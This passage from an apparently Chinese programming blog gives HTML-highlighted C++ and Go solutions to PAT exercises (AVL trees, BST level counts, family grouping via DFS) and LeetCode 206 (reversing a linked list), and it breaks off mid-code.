class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//PAT A1123</span></span><br><span class="line"><span class="comment">//平衡二叉树（AVL）</span></span><br><span class="line"><span class="comment">//生成平衡二叉树 + 层序遍历 + 判断是否为完全二叉树</span></span><br><span class="line"><span class="comment">//用队列层序输出时，判断第一个无孩子结点之后输出的结点是否有孩子，用来判断是否是完全二叉树</span></span><br><span class="line"><span class="keyword">int</span> od[<span class="number">30</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="keyword">int</span> height;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成一个新节点</span></span><br><span class="line"><span class="function">NODE *<span class="title">newNode</span><span class="params">(<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NODE *node=<span class="keyword">new</span> NODE;</span><br><span class="line">    node-&gt;data=v;</span><br><span class="line">    node-&gt;height=<span class="number">1</span>;</span><br><span class="line">    node-&gt;left=node-&gt;right=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取节点height</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHeight</span><span class="params">(NODE *node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(node==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> node-&gt;height;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算节点平衡因子</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getBalance</span><span class="params">(NODE *node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">getHeight</span>(node-&gt;left)-<span class="built_in">getHeight</span>(node-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//更新节点高度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">updateHeight</span><span class="params">(NODE *node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node-&gt;height=<span class="built_in">max</span>(<span class="built_in">getHeight</span>(node-&gt;left),<span class="built_in">getHeight</span>(node-&gt;right))+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//左旋</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">L</span><span class="params">(NODE* &amp;node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NODE* temp=node-&gt;right;</span><br><span class="line">    node-&gt;right=temp-&gt;left;</span><br><span class="line">    temp-&gt;left=node;</span><br><span class="line">    <span class="built_in">updateHeight</span>(node);</span><br><span class="line">    <span class="built_in">updateHeight</span>(temp);</span><br><span class="line">    node=temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//右旋</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">R</span><span class="params">(NODE* &amp;node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NODE* temp=node-&gt;left;</span><br><span class="line">    node-&gt;left=temp-&gt;right;</span><br><span class="line">    temp-&gt;right=node;</span><br><span class="line">    <span class="built_in">updateHeight</span>(node);</span><br><span class="line">    <span class="built_in">updateHeight</span>(temp);</span><br><span class="line">    node=temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(NODE* &amp;root,<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        root=<span class="built_in">newNode</span>(v);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(v&lt;root-&gt;data)&#123;</span><br><span class="line">        <span class="built_in">insert</span>(root-&gt;left,v);</span><br><span class="line">        <span class="built_in">updateHeight</span>(root);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">getBalance</span>(root)==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">getBalance</span>(root-&gt;left)==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">R</span>(root);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">getBalance</span>(root-&gt;left)==<span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">L</span>(root-&gt;left);</span><br><span class="line">                <span class="built_in">R</span>(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">insert</span>(root-&gt;right,v);</span><br><span class="line">        <span class="built_in">updateHeight</span>(root);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">getBalance</span>(root)==<span class="number">-2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">getBalance</span>(root-&gt;right)==<span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">L</span>(root);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">getBalance</span>(root-&gt;right)==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">R</span>(root-&gt;right);</span><br><span class="line">                <span class="built_in">L</span>(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NODE* <span class="title">create</span><span class="params">(<span class="keyword">int</span> data[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NODE *root=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">insert</span>(root,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> complete=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">bool</span> havechild=<span class="literal">true</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">levelOrder</span><span class="params">(NODE *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    queue&lt;NODE*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        NODE *node=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(node-&gt;left!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(!havechild) complete=<span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> havechild=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(node-&gt;right!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            <span class="keyword">if</span>(!havechild) complete=<span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> havechild=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(num==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,node-&gt;data);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,node-&gt;data);</span><br><span class="line">        num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;od[i]);</span><br><span class="line">    <span class="comment">//生成平衡二叉树</span></span><br><span class="line">    NODE *root=<span class="built_in">create</span>(od,n);</span><br><span class="line">    <span class="comment">//层序遍历</span></span><br><span class="line">    <span class="built_in">levelOrder</span>(root);</span><br><span class="line">    <span class="keyword">if</span>(complete) <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="PAT-A1115-C"><a href="#PAT-A1115-C" class="headerlink" title="PAT A1115_C"></a>PAT A1115_C</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1115</span></span><br><span class="line"><span class="comment">//建立一个二叉树</span></span><br><span class="line"><span class="comment">//统计最后两层的节点的数量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="keyword">int</span> layer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span>* <span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span>* <span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1010</span>;</span><br><span class="line"><span class="keyword">int</span> od[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function">NODE* <span class="title">newNODE</span><span class="params">(<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NODE* node=<span class="keyword">new</span> NODE;</span><br><span class="line">    node-&gt;data=v;</span><br><span class="line">    node-&gt;layer=<span class="number">1</span>;</span><br><span class="line">    node-&gt;left=node-&gt;right=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(NODE* &amp;root,<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        root=<span class="built_in">newNODE</span>(v);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(v&lt;=root-&gt;data)&#123;</span><br><span class="line">        <span class="built_in">insert</span>(root-&gt;left,v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">insert</span>(root-&gt;right,v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NODE* <span class="title">create</span><span class="params">(<span class="keyword">int</span> data[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NODE *root=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">insert</span>(root,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> level[maxn]=&#123;<span class="number">0</span>&#125;; <span class="comment">//记录每一行的节点数</span></span><br><span class="line"><span class="keyword">int</span> deep=<span class="number">-1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">levelOrder</span><span class="params">(NODE* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    queue&lt;NODE*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        NODE* node =q.<span class="built_in">front</span>();</span><br><span class="line">        deep=<span class="built_in">max</span>(deep,node-&gt;layer);</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(node-&gt;left!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            node-&gt;left-&gt;layer=node-&gt;layer+<span class="number">1</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node-&gt;right!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            node-&gt;right-&gt;layer=node-&gt;layer+<span class="number">1</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        level[node-&gt;layer]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;od[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    NODE* root=<span class="built_in">create</span>(od,n);</span><br><span class="line">    <span class="built_in">levelOrder</span>(root);</span><br><span class="line">    <span class="comment">//printf(&quot;%d&quot;,level[deep]);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%d&quot;,level[deep-1]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d + %d = %d\n&quot;</span>,level[deep],level[deep<span class="number">-1</span>],level[deep]+level[deep<span class="number">-1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="PAT-A1114-C"><a href="#PAT-A1114-C" class="headerlink" title="PAT A1114_C"></a>PAT A1114_C</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="comment">//去TY的并查集，真复杂，直接邻接表</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">10000</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span>&#123;</span> <span class="keyword">int</span> e,a;&#125;per[maxn]; <span class="comment">//存放住宅数，住宅面积</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Family</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id,member;</span><br><span class="line">    <span class="keyword">double</span> avga,avge;</span><br><span class="line">    <span class="built_in">Family</span>(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">double</span> c,<span class="keyword">double</span> d): <span class="built_in">id</span>(a), <span class="built_in">member</span>(b), <span class="built_in">avge</span>(c), <span class="built_in">avga</span>(d) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">bool</span> table[maxn],vis[maxn];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; adj[maxn];</span><br><span class="line">vector&lt;Family&gt; ans;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(Family a,Family b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.avga!=b.avga?a.avga&gt;b.avga:a.id&lt;b.id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> u,LL &amp;sumE,LL &amp;sumA,<span class="keyword">int</span> &amp;member)</span></span>&#123;</span><br><span class="line">    vis[u] = <span class="number">1</span>;</span><br><span class="line">    member++;</span><br><span class="line">    sumE += per[u].e;</span><br><span class="line">    sumA += per[u].a;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;adj[u].<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> v = adj[u][i];</span><br><span class="line">        <span class="keyword">if</span>(!vis[v])</span><br><span class="line">            <span class="built_in">DFS</span>(v,sumE,sumA,member);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,id,fid,mid,k,cid,e,a;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;id&gt;&gt;fid&gt;&gt;mid;</span><br><span class="line">        table[id] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(fid!=<span class="number">-1</span>)&#123;</span><br><span class="line">            adj[id].<span class="built_in">push_back</span>(fid);</span><br><span class="line">            adj[fid].<span class="built_in">push_back</span>(id);</span><br><span class="line">            table[fid] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(mid!=<span class="number">-1</span>)&#123;</span><br><span class="line">            adj[id].<span class="built_in">push_back</span>(mid);</span><br><span class="line">            adj[mid].<span class="built_in">push_back</span>(id);</span><br><span class="line">            table[mid] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cin&gt;&gt;k;</span><br><span class="line">        <span class="keyword">while</span>(k--)&#123;</span><br><span class="line">            cin&gt;&gt;cid;</span><br><span class="line">            adj[id].<span class="built_in">push_back</span>(cid);</span><br><span class="line">            adj[cid].<span class="built_in">push_back</span>(id);</span><br><span class="line">            table[cid] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cin&gt;&gt;per[id].e&gt;&gt;per[id].a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> u=<span class="number">0</span>;u&lt;maxn;u++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(table[u] &amp;&amp; !vis[u])&#123;</span><br><span class="line">            LL sumE = <span class="number">0</span>,sumA = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> member = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">DFS</span>(u,sumE,sumA,member);</span><br><span class="line">            cnt++;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(<span class="built_in">Family</span>(u,member,<span class="number">1.0</span>*sumE/member,<span class="number">1.0</span>*sumA/member));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;cnt&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">sort</span>(ans.<span class="built_in">begin</span>(),ans.<span class="built_in">end</span>(),cmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cnt;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%04d %d %.3lf %.3lf\n&quot;</span>,ans[i].id,ans[i].member,ans[i].avge,ans[i].avga);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-206-反转链表-C"><a href="#leetcode-206-反转链表-C" class="headerlink" title="leetcode 206. 反转链表_C"></a>leetcode 206. 反转链表_C</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//preNode表示当前节点的前一个节点</span></span><br><span class="line">    ListNode *preNode = head;</span><br><span class="line">    <span class="comment">//当前节点curNode</span></span><br><span class="line">    ListNode *curNode = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (curNode != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//nextNode,表示当前节点的下一个节点</span></span><br><span class="line">        ListNode* nextNode = curNode-&gt;next;</span><br><span class="line">        curNode-&gt;next = preNode;</span><br><span class="line">        preNode = curNode;</span><br><span class="line">        curNode = nextNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> preNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    ListNode* root=<span class="keyword">new</span> ListNode;</span><br><span class="line">    ListNode* head=<span class="keyword">new</span> ListNode;</span><br><span class="line">    head-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    root=head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d-&gt;&quot;</span>,&amp;head-&gt;val);</span><br><span class="line">        ListNode* temp=<span class="keyword">new</span> ListNode;</span><br><span class="line">        head-&gt;next=temp;</span><br><span class="line">        head=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    head-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    ListNode* pre =<span class="built_in">reverseList</span>(root);</span><br><span class="line">    pre=pre-&gt;next;</span><br><span class="line">    <span class="comment">//pre=root-&gt;next;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d-&gt;&quot;</span>,pre-&gt;val);</span><br><span class="line">        pre=pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-206-反转链表-Go"><a href="#leetcode-206-反转链表-Go" class="headerlink" title="leetcode 206. 反转链表_Go"></a>leetcode 206. 反转链表_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ListNode ,just a struct</span></span><br><span class="line"><span class="keyword">type</span> ListNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	Val  <span class="keyword">int</span></span><br><span class="line">	Next *ListNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reverseList</span><span class="params">(head *ListNode)</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> preNode *ListNode</span><br><span class="line">	preNode = <span class="literal">nil</span></span><br><span class="line">	curNode := head</span><br><span class="line">	<span class="keyword">for</span> curNode != <span class="literal">nil</span> &#123;</span><br><span class="line">		next := curNode.Next</span><br><span class="line">		curNode.Next = preNode</span><br><span class="line">		preNode = curNode</span><br><span class="line">		curNode = next</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> preNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	n := <span class="number">0</span></span><br><span class="line">	fmt.Scanf(<span class="string">&quot;%d\n&quot;</span>, &amp;n)</span><br><span class="line">	<span class="keyword">var</span> root *ListNode = <span class="built_in">new</span>(ListNode)</span><br><span class="line">	<span class="keyword">var</span> head *ListNode = <span class="built_in">new</span>(ListNode)</span><br><span class="line">	<span class="comment">//var temp *ListNode = new(ListNode)</span></span><br><span class="line">	root = head</span><br><span class="line">	<span class="comment">//fmt.Printf(&quot;%p\n&quot;, root)</span></span><br><span class="line">	<span 